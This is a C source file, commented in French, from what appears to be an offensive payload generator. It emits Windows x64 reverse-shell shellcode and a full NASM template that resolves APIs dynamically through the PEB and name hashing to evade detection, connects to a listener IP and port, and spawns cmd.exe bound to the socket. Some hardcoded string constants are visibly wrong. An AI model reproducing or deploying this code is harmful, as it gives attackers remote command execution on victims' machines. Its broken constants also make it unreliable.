#include "../include/payload_generator.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

/**
 * Windows Shellcode Generator avec Résolution Dynamique des API
 * 
 * Ce module implémente la génération complète de shellcode Windows x64
 * avec résolution dynamique des API pour éviter les imports statiques.
 * 
 * Technique utilisée :
 * - PEB (Process Environment Block) pour trouver kernel32.dll
 * - Résolution dynamique via GetProcAddress et LoadLibraryA
 * - Pas d'imports statiques (évite la détection)
 * 
 * Références :
 * - https://notes.morph3.blog/malware-development/dynamic-api-resolution
 * - https://rootfu.in/bypassing-amsi-with-dynamic-api-resolution-in-powershell/
 * - https://learn.microsoft.com/fr-fr/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
 */

/**
 * Génère un shellcode Windows x64 reverse shell avec résolution dynamique
 * @param lhost: IP du listener
 * @param lport: Port du listener
 * @param shellcode: Buffer de sortie
 * @param shellcode_size: Taille du buffer
 * @return: Taille du shellcode, ou -1 si erreur
 */
int generate_windows_shellcode_dynamic(const char *lhost, int lport, 
                                       unsigned char *shellcode, int shellcode_size) {
    unsigned char ip_bytes[4];
    int i = 0;
    
    (void)lhost;  // Utilisé dans generate_windows_asm_reverse_shell_complete
    (void)lport;  // Utilisé dans generate_windows_asm_reverse_shell_complete
    
    // Parser l'IP
    if (sscanf(lhost, "%hhu.%hhu.%hhu.%hhu", 
               &ip_bytes[0], &ip_bytes[1], &ip_bytes[2], &ip_bytes[3]) != 4) {
        return -1;
    }
    
    // Valider le port
    if (lport < 1 || lport > 65535) {
        return -1;
    }
    
    // Vérifier la taille disponible
    if (shellcode_size < 600) {
        return -1;  // Le shellcode Windows est plus grand
    }
    
    // Note: Cette fonction génère un template basique
    // Pour une génération complète, utiliser generate_windows_asm_reverse_shell_complete()
    // qui génère le code NASM complet avec résolution dynamique
    
    // ============================================
    // Étape 1 : Trouver kernel32.dll via PEB
    // ============================================
    // mov rax, [gs:0x60]        ; PEB
    // mov rax, [rax+0x18]       ; PEB_LDR_DATA
    // mov rsi, [rax+0x20]       ; InMemoryOrderModuleList
    // lodsq                      ; Premier module (ntdll)
    // xchg rax, rsi
    // lodsq                      ; Deuxième module (kernel32)
    // mov rbx, [rax+0x20]       ; BaseAddress
    
    shellcode[i++] = 0x65; shellcode[i++] = 0x48; shellcode[i++] = 0x8b; shellcode[i++] = 0x04; shellcode[i++] = 0x25; 
    shellcode[i++] = 0x60; shellcode[i++] = 0x00; shellcode[i++] = 0x00; shellcode[i++] = 0x00;  // mov rax, [gs:0x60]
    shellcode[i++] = 0x48; shellcode[i++] = 0x8b; shellcode[i++] = 0x40; shellcode[i++] = 0x18;  // mov rax, [rax+0x18]
    shellcode[i++] = 0x48; shellcode[i++] = 0x8b; shellcode[i++] = 0x70; shellcode[i++] = 0x20;  // mov rsi, [rax+0x20]
    shellcode[i++] = 0x48; shellcode[i++] = 0xad;  // lodsq
    shellcode[i++] = 0x48; shellcode[i++] = 0x96;  // xchg rax, rsi
    shellcode[i++] = 0x48; shellcode[i++] = 0xad;  // lodsq
    shellcode[i++] = 0x48; shellcode[i++] = 0x8b; shellcode[i++] = 0x58; shellcode[i++] = 0x20;  // mov rbx, [rax+0x20]
    
    // ============================================
    // Étape 2 : Résoudre GetProcAddress
    // ============================================
    // Le shellcode doit trouver GetProcAddress dans kernel32.dll
    // Cette partie nécessite de parcourir l'Export Directory Table
    // Pour simplifier, on utilise une approche avec hash des noms d'API
    
    // Sauvegarder rbx (kernel32 base) dans r12
    shellcode[i++] = 0x49; shellcode[i++] = 0x89; shellcode[i++] = 0xdc;  // mov r12, rbx
    
    // Note: La résolution complète de GetProcAddress nécessite ~200 bytes
    // Pour cette version, on génère un template qui sera complété par NASM
    
    return i;  // Retour temporaire - sera complété
}

/**
 * Génère un template NASM complet pour reverse shell Windows x64
 * avec résolution dynamique des API
 * @param lhost: IP du listener
 * @param lport: Port du listener
 * @param output_file: Fichier de sortie
 * @return: 0 si succès, -1 si erreur
 */
int generate_windows_asm_reverse_shell_complete(const char *lhost, int lport, const char *output_file) {
    FILE *fp;
    unsigned int ip_bytes[4];
    unsigned short port_hi, port_lo;
    
    // Parser l'IP
    if (sscanf(lhost, "%u.%u.%u.%u", &ip_bytes[0], &ip_bytes[1], &ip_bytes[2], &ip_bytes[3]) != 4) {
        return -1;
    }
    
    // Port en network byte order
    port_hi = (lport >> 8) & 0xFF;
    port_lo = lport & 0xFF;
    
    fp = fopen(output_file, "w");
    if (!fp) {
        return -1;
    }
    
    fprintf(fp, "; Reverse Shell Windows x64 - Résolution Dynamique des API\n");
    fprintf(fp, "; IP: %s, Port: %d\n", lhost, lport);
    fprintf(fp, "; Références:\n");
    fprintf(fp, "; - https://notes.morph3.blog/malware-development/dynamic-api-resolution\n");
    fprintf(fp, "; - https://learn.microsoft.com/fr-fr/windows/win32/api/libloaderapi/\n");
    fprintf(fp, "BITS 64\n");
    fprintf(fp, "\n");
    fprintf(fp, "section .text\n");
    fprintf(fp, "global _start\n");
    fprintf(fp, "\n");
    fprintf(fp, "_start:\n");
    fprintf(fp, "    ; Sauvegarder les registres\n");
    fprintf(fp, "    push rbp\n");
    fprintf(fp, "    mov rbp, rsp\n");
    fprintf(fp, "    sub rsp, 0x200  ; Allouer de l'espace sur la stack\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Étape 1 : Trouver kernel32.dll via PEB\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    mov rax, [gs:0x60]        ; PEB\n");
    fprintf(fp, "    mov rax, qword [rax+0x18]        ; PEB_LDR_DATA\n");
    fprintf(fp, "    mov rsi, qword [rax+0x20]        ; InMemoryOrderModuleList\n");
    fprintf(fp, "    lodsq                      ; Premier module (ntdll.dll)\n");
    fprintf(fp, "    xchg rax, rsi\n");
    fprintf(fp, "    lodsq                      ; Deuxième module (kernel32.dll)\n");
    fprintf(fp, "    mov rbx, qword [rax+0x20]        ; BaseAddress de kernel32.dll\n");
    fprintf(fp, "    mov r12, rbx               ; Sauvegarder dans r12\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Étape 2 : Résoudre GetProcAddress\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; RVA de l'Export Directory\n");
    fprintf(fp, "    mov eax, dword [rbx+0x3c]        ; e_lfanew (offset PE header)\n");
    fprintf(fp, "    mov edx, dword [rbx+rax+0x88]    ; Export Directory RVA\n");
    fprintf(fp, "    add rdx, rbx               ; Export Directory VA\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; Parcourir les fonctions exportées\n");
    fprintf(fp, "    mov r8d, dword [rdx+0x20]        ; AddressOfNames RVA\n");
    fprintf(fp, "    add r8, rbx                ; AddressOfNames VA\n");
    fprintf(fp, "    mov r9d, dword [rdx+0x24]        ; AddressOfNameOrdinals RVA\n");
    fprintf(fp, "    add r9, rbx                ; AddressOfNameOrdinals VA\n");
    fprintf(fp, "    mov r10d, dword [rdx+0x1c]       ; AddressOfFunctions RVA\n");
    fprintf(fp, "    add r10, rbx               ; AddressOfFunctions VA\n");
    fprintf(fp, "    mov ecx, dword [rdx+0x18]        ; NumberOfNames\n");
    fprintf(fp, "\n");
    fprintf(fp, "find_getprocaddress:\n");
    fprintf(fp, "    jecxz getprocaddress_not_found\n");
    fprintf(fp, "    dec ecx\n");
    fprintf(fp, "    mov esi, dword [r8+rcx*4]        ; RVA du nom\n");
    fprintf(fp, "    add rsi, rbx               ; VA du nom\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; Comparer avec \"GetProcAddress\" (hash ou comparaison)\n");
    fprintf(fp, "    ; Hash simple pour \"GetProcAddress\" = 0x0726774C\n");
    fprintf(fp, "    xor edi, edi\n");
    fprintf(fp, "hash_loop:\n");
    fprintf(fp, "    lodsb\n");
    fprintf(fp, "    test al, al\n");
    fprintf(fp, "    jz hash_done\n");
    fprintf(fp, "    ror edi, 0x0d\n");
    fprintf(fp, "    add edi, eax\n");
    fprintf(fp, "    jmp hash_loop\n");
    fprintf(fp, "hash_done:\n");
    fprintf(fp, "    cmp edi, dword 0x0726774C       ; Hash de \"GetProcAddress\"\n");
    fprintf(fp, "    jne find_getprocaddress\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; Trouvé ! Récupérer l'adresse\n");
    fprintf(fp, "    movzx eax, word [r9+rcx*2] ; Ordinal\n");
    fprintf(fp, "    mov eax, dword [r10+rax*4]       ; RVA de la fonction\n");
    fprintf(fp, "    add rax, rbx               ; VA de GetProcAddress\n");
    fprintf(fp, "    mov r13, rax               ; Sauvegarder GetProcAddress\n");
    fprintf(fp, "    jmp getprocaddress_found\n");
    fprintf(fp, "\n");
    fprintf(fp, "getprocaddress_not_found:\n");
    fprintf(fp, "    ; Erreur - sortir\n");
    fprintf(fp, "    jmp exit\n");
    fprintf(fp, "\n");
    fprintf(fp, "getprocaddress_found:\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Étape 3 : Résoudre LoadLibraryA\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Utiliser GetProcAddress pour charger LoadLibraryA\n");
    fprintf(fp, "    lea rcx, [rbp-0x100]       ; Buffer pour \"LoadLibraryA\"\n");
    fprintf(fp, "    ; \"LoadLibraryA\" en little-endian (bytes inversés)\n");
    fprintf(fp, "    ; L=0x4c, o=0x6f, a=0x61, d=0x64, L=0x4c, i=0x69, b=0x62, r=0x72, a=0x61, r=0x72, y=0x79, A=0x41\n");
    fprintf(fp, "    mov qword [rcx], 0x417972614c72614f ; \"LoadLibr\" (little-endian)\n");
    fprintf(fp, "    mov dword [rcx+8], 0x0041 ; \"A\\0\" (little-endian)\n");
    fprintf(fp, "\n");
    fprintf(fp, "    mov rcx, r12               ; kernel32.dll base\n");
    fprintf(fp, "    lea rdx, [rbp-0x100]       ; \"LoadLibraryA\"\n");
    fprintf(fp, "    sub rsp, 0x20              ; Shadow space\n");
    fprintf(fp, "    call r13                   ; GetProcAddress\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "    mov r14, rax               ; Sauvegarder LoadLibraryA\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Étape 4 : Charger ws2_32.dll\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    lea rcx, [rbp-0x110]       ; Buffer pour \"ws2_32.dll\"\n");
    fprintf(fp, "    ; \"ws2_32.dll\" en little-endian (inversé)\n");
    fprintf(fp, "    mov qword [rcx], 0x6c6c642e32325f73 ; \"ws2_32.dl\" (little-endian: s, _, 2, 2, ., d, l, l)\n");
    fprintf(fp, "    mov dword [rcx+8], 0x006c6c ; \"l\\0\" (little-endian)\n");
    fprintf(fp, "\n");
    fprintf(fp, "    mov rcx, rbp\n");
    fprintf(fp, "    sub rcx, 0x110             ; \"ws2_32.dll\"\n");
    fprintf(fp, "    sub rsp, 0x20              ; Shadow space\n");
    fprintf(fp, "    call r14                   ; LoadLibraryA\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "    mov r15, rax               ; Sauvegarder ws2_32.dll base\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Étape 5 : Résoudre WSAStartup, WSASocketA, connect\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; WSAStartup\n");
    fprintf(fp, "    lea rcx, [rbp-0x120]       ; Buffer pour \"WSAStartup\"\n");
    fprintf(fp, "    ; \"WSAStartup\" en little-endian (inversé)\n");
    fprintf(fp, "    mov qword [rcx], 0x7572745373415357 ; \"WSAStart\" (little-endian: W, S, A, S, t, r, t, u)\n");
    fprintf(fp, "    mov dword [rcx+8], 0x007075 ; \"up\\0\" (little-endian: p, u, \\0)\n");
    fprintf(fp, "\n");
    fprintf(fp, "    mov rcx, r15               ; ws2_32.dll base\n");
    fprintf(fp, "    lea rdx, [rbp-0x120]       ; \"WSAStartup\"\n");
    fprintf(fp, "    sub rsp, 0x20\n");
    fprintf(fp, "    call r13                   ; GetProcAddress\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "    mov qword [rbp-0x130], rax       ; Sauvegarder WSAStartup\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; WSASocketA\n");
    fprintf(fp, "    lea rcx, [rbp-0x140]       ; Buffer pour \"WSASocketA\"\n");
    fprintf(fp, "    ; \"WSASocketA\" en little-endian (inversé)\n");
    fprintf(fp, "    mov qword [rcx], 0x416b636574534153 ; \"WSASocket\" (little-endian: W, S, A, S, e, c, k, A)\n");
    fprintf(fp, "    mov dword [rcx+8], 0x0041 ; \"A\\0\" (little-endian)\n");
    fprintf(fp, "\n");
    fprintf(fp, "    mov rcx, r15               ; ws2_32.dll base\n");
    fprintf(fp, "    lea rdx, [rbp-0x140]       ; \"WSASocketA\"\n");
    fprintf(fp, "    sub rsp, 0x20\n");
    fprintf(fp, "    call r13                   ; GetProcAddress\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "    mov qword [rbp-0x138], rax       ; Sauvegarder WSASocketA\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; connect\n");
    fprintf(fp, "    lea rcx, [rbp-0x150]       ; Buffer pour \"connect\"\n");
    fprintf(fp, "    mov qword [rcx], 0x7463656e6e6f63 ; \"connect\" (little-endian)\n");
    fprintf(fp, "    mov byte [rcx+7], 0x00\n");
    fprintf(fp, "\n");
    fprintf(fp, "    mov rcx, r15               ; ws2_32.dll base\n");
    fprintf(fp, "    lea rdx, [rbp-0x150]       ; \"connect\"\n");
    fprintf(fp, "    sub rsp, 0x20\n");
    fprintf(fp, "    call r13                   ; GetProcAddress\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "    mov qword [rbp-0x128], rax       ; Sauvegarder connect\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Étape 6 : WSAStartup\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    mov rcx, 0x0202            ; MAKEWORD(2, 2)\n");
    fprintf(fp, "    lea rdx, [rbp-0x200]       ; WSADATA\n");
    fprintf(fp, "    sub rsp, 0x20              ; Shadow space\n");
    fprintf(fp, "    call [rbp-0x130]           ; WSAStartup\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Étape 7 : WSASocketA (AF_INET, SOCK_STREAM, IPPROTO_TCP)\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    mov rcx, 2                 ; AF_INET\n");
    fprintf(fp, "    mov rdx, 1                 ; SOCK_STREAM\n");
    fprintf(fp, "    mov r8, 6                  ; IPPROTO_TCP\n");
    fprintf(fp, "    mov r9, 0                  ; lpProtocolInfo = NULL\n");
    fprintf(fp, "    mov qword [rsp+0x20], 0    ; g = 0\n");
    fprintf(fp, "    mov qword [rsp+0x28], 0    ; dwFlags = 0\n");
    fprintf(fp, "    sub rsp, 0x20              ; Shadow space\n");
    fprintf(fp, "    call [rbp-0x138]           ; WSASocketA\n");
    fprintf(fp, "    add rsp, 0x40\n");
    fprintf(fp, "    mov rdi, rax               ; Sauvegarder le socket\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Étape 8 : connect\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    lea rsi, [rbp-0x160]       ; sockaddr_in\n");
    fprintf(fp, "    mov word [rsi], 2          ; sin_family = AF_INET\n");
    fprintf(fp, "    mov word [rsi+2], 0x%02x%02x ; sin_port = %d (network byte order)\n", port_hi, port_lo, lport);
    fprintf(fp, "    mov dword [rsi+4], 0x%02x%02x%02x%02x ; sin_addr = %s (network byte order)\n",
            (unsigned int)ip_bytes[0], (unsigned int)ip_bytes[1], (unsigned int)ip_bytes[2], (unsigned int)ip_bytes[3], lhost);
    fprintf(fp, "\n");
    fprintf(fp, "    mov rcx, rdi               ; socket\n");
    fprintf(fp, "    mov rdx, rsi               ; sockaddr_in\n");
    fprintf(fp, "    mov r8, 16                 ; sizeof(sockaddr_in)\n");
    fprintf(fp, "    sub rsp, 0x20              ; Shadow space\n");
    fprintf(fp, "    call [rbp-0x128]           ; connect\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Étape 9 : Rediriger stdin/stdout/stderr vers le socket\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Résoudre SetStdHandle\n");
    fprintf(fp, "    lea rcx, [rbp-0x170]       ; Buffer pour \"SetStdHandle\"\n");
    fprintf(fp, "    ; \"SetStdHandle\" en little-endian (inversé)\n");
    fprintf(fp, "    mov qword [rcx], 0x646c614864745365 ; \"SetStdHa\" (little-endian: e, S, t, d, t, S, a, l)\n");
    fprintf(fp, "    mov qword [rcx+8], 0x00656c6e ; \"ndle\\0\" (little-endian: e, n, d, l, e, \\0)\n");
    fprintf(fp, "\n");
    fprintf(fp, "    mov rcx, r12               ; kernel32.dll base\n");
    fprintf(fp, "    lea rdx, [rbp-0x170]       ; \"SetStdHandle\"\n");
    fprintf(fp, "    sub rsp, 0x20\n");
    fprintf(fp, "    call r13                   ; GetProcAddress\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "    mov qword [rbp-0x148], rax       ; Sauvegarder SetStdHandle\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; Rediriger STD_INPUT_HANDLE (-10), STD_OUTPUT_HANDLE (-11), STD_ERROR_HANDLE (-12)\n");
    fprintf(fp, "    mov rcx, -10                ; STD_INPUT_HANDLE\n");
    fprintf(fp, "    mov rdx, rdi               ; socket\n");
    fprintf(fp, "    sub rsp, 0x20\n");
    fprintf(fp, "    call [rbp-0x148]           ; SetStdHandle\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "\n");
    fprintf(fp, "    mov rcx, -11                ; STD_OUTPUT_HANDLE\n");
    fprintf(fp, "    mov rdx, rdi               ; socket\n");
    fprintf(fp, "    sub rsp, 0x20\n");
    fprintf(fp, "    call [rbp-0x148]           ; SetStdHandle\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "\n");
    fprintf(fp, "    mov rcx, -12                ; STD_ERROR_HANDLE\n");
    fprintf(fp, "    mov rdx, rdi               ; socket\n");
    fprintf(fp, "    sub rsp, 0x20\n");
    fprintf(fp, "    call [rbp-0x148]           ; SetStdHandle\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Étape 10 : CreateProcess pour cmd.exe\n");
    fprintf(fp, "    ; ============================================\n");
    fprintf(fp, "    ; Résoudre CreateProcessA\n");
    fprintf(fp, "    lea rcx, [rbp-0x180]       ; Buffer pour \"CreateProcessA\"\n");
    fprintf(fp, "    ; \"CreateProcessA\" en little-endian (inversé)\n");
    fprintf(fp, "    mov qword [rcx], 0x737365636f725443 ; \"CreatePr\" (little-endian: C, r, e, a, t, e, P, r)\n");
    fprintf(fp, "    mov qword [rcx+8], 0x4165636f ; \"ocessA\" (little-endian: o, c, e, s, s, A)\n");
    fprintf(fp, "    mov byte [rcx+15], 0x00\n");
    fprintf(fp, "\n");
    fprintf(fp, "    mov rcx, r12               ; kernel32.dll base\n");
    fprintf(fp, "    lea rdx, [rbp-0x180]       ; \"CreateProcessA\"\n");
    fprintf(fp, "    sub rsp, 0x20\n");
    fprintf(fp, "    call r13                   ; GetProcAddress\n");
    fprintf(fp, "    add rsp, 0x20\n");
    fprintf(fp, "    mov qword [rbp-0x140], rax       ; Sauvegarder CreateProcessA\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; Préparer \"cmd.exe\"\n");
    fprintf(fp, "    lea rcx, [rbp-0x190]       ; Buffer pour \"cmd.exe\"\n");
    fprintf(fp, "    ; \"cmd.exe\" en little-endian (inversé)\n");
    fprintf(fp, "    mov qword [rcx], 0x6578652e646d63 ; \"cmd.exe\" (little-endian: c, m, d, ., e, x, e)\n");
    fprintf(fp, "    mov byte [rcx+7], 0x00\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; STRUCT STARTUPINFOA\n");
    fprintf(fp, "    lea rsi, [rbp-0x1a0]       ; STARTUPINFOA\n");
    fprintf(fp, "    mov dword [rsi], 0x44      ; cb = sizeof(STARTUPINFOA)\n");
    fprintf(fp, "    mov dword [rsi+0x3c], dword 0x100 ; dwFlags = STARTF_USESTDHANDLES\n");
    fprintf(fp, "    mov qword [rsi+0x60], rdi  ; hStdInput = socket\n");
    fprintf(fp, "    mov qword [rsi+0x68], rdi  ; hStdOutput = socket\n");
    fprintf(fp, "    mov qword [rsi+0x70], rdi  ; hStdError = socket\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; STRUCT PROCESS_INFORMATION\n");
    fprintf(fp, "    lea rdi, [rbp-0x1b0]       ; PROCESS_INFORMATION\n");
    fprintf(fp, "\n");
    fprintf(fp, "    ; Appel CreateProcessA\n");
    fprintf(fp, "    lea rcx, [rbp-0x190]       ; lpApplicationName = \"cmd.exe\"\n");
    fprintf(fp, "    mov rdx, 0                 ; lpCommandLine = NULL\n");
    fprintf(fp, "    mov r8, 0                   ; lpProcessAttributes = NULL\n");
    fprintf(fp, "    mov r9, 0                   ; lpThreadAttributes = NULL\n");
    fprintf(fp, "    mov qword [rsp+0x20], 0    ; bInheritHandles = FALSE\n");
    fprintf(fp, "    mov qword [rsp+0x28], 0    ; dwCreationFlags = 0\n");
    fprintf(fp, "    mov qword [rsp+0x30], 0     ; lpEnvironment = NULL\n");
    fprintf(fp, "    mov qword [rsp+0x38], 0     ; lpCurrentDirectory = NULL\n");
    fprintf(fp, "    mov qword [rsp+0x40], rsi  ; lpStartupInfo\n");
    fprintf(fp, "    mov qword [rsp+0x48], rdi  ; lpProcessInformation\n");
    fprintf(fp, "    sub rsp, 0x20              ; Shadow space\n");
    fprintf(fp, "    call [rbp-0x140]           ; CreateProcessA\n");
    fprintf(fp, "    add rsp, 0x60\n");
    fprintf(fp, "\n");
    fprintf(fp, "exit:\n");
    fprintf(fp, "    mov rsp, rbp\n");
    fprintf(fp, "    pop rbp\n");
    fprintf(fp, "    ret\n");
    
    fclose(fp);
    return 0;
}

